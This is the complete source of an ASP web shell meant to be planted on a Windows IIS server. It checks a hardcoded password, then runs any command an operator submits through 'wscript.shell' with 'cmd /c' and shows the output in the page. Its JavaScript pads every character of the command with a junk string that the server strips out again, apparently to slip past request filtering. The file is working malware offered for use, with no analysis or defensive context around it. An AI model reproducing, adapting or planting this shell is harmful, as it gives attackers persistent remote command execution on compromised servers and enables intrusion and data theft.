<%
	Dim c
	Dim p                      
	Dim r
	Dim pw
	Dim page
	Dim desultory
	Dim result_cd
	Dim result
	
	result = ""
	Set result_cd = CreateObject("wscript.shell").exec("cmd /c" & "cd")
	c = ""
	desultory = "RTHHDRYY%$T#GFDG%Y#QFSDFFDGFGHBC@#$$^12433tdf"
	page = request.ServerVariables("PATH_INFO")
	pw = "!@#"
	
	p = Request.Form("pname")
	c = Request.Form("cname")
	
	Session.Timeout=5

	If Session("uname") = "" And p = "" Then
	%>
		<form method="post" action=<%=page%>>
			<input type="text" name="pname"><br>
			<input type="submit" value="p">
		</form>
	<%  
		'Response.Write("<script>location.href='" & page & "';</script>")
		response.end
	ElseIf Session("uname") = "" And p <> "" Then
		If pw = p Then
			Response.Write("correct")
			Session("uname")="Donald Duck"
		Else
			Response.Write("wrong")
		End If
		
		Response.Write("<script>location.href='" & page & "';</script>")
		Response.End
	End If

	If c <> "" Then
		c = Replace(c,desultory,"")
		Set r = CreateObject("wscript.shell").exec("cmd /c" & c)

		Do While Not r.StdOut.AtEndOfStream
			result = result & r.StdOut.ReadLine
			result = result & "<br>"
		Loop
		
	End If
%>


<script>
    document.addEventListener("keydown", (event) => {
        if(event.keyCode == 13) {
            cmdRequest();
        }
    });

    function cmdRequest() {
        const cmdForm = document.cmdForm;
        const cmd = cmdForm.cname.value;
        let enc_cmd = '';

        for( var i = 0 ; i < cmd.length; i++) {
			enc_cmd += cmd.charAt(i) + '<%=desultory%>';
        }

        cmdForm.cname.value = enc_cmd;
        cmdForm.action = '<%=page%>';
        cmdForm.submit();
    }
</script>

<h1>ASP WebShell</h1>
<form name="cmdForm" method="POST">
    <input name="cname" type="text" autofocus>
</form>
<p><%=result_cd.StdOut.ReadAll%> > <%=c%> </p>

<hr>
<%
	If c <> "" And result <> "" Then 
%>
	<table style="border: 1px solid black; background-color: black">
		<tr>
			<td style="color: white; font-size: 15px">
				<%=result%>
			</td>
		</tr>
	</table>
<% End If %>
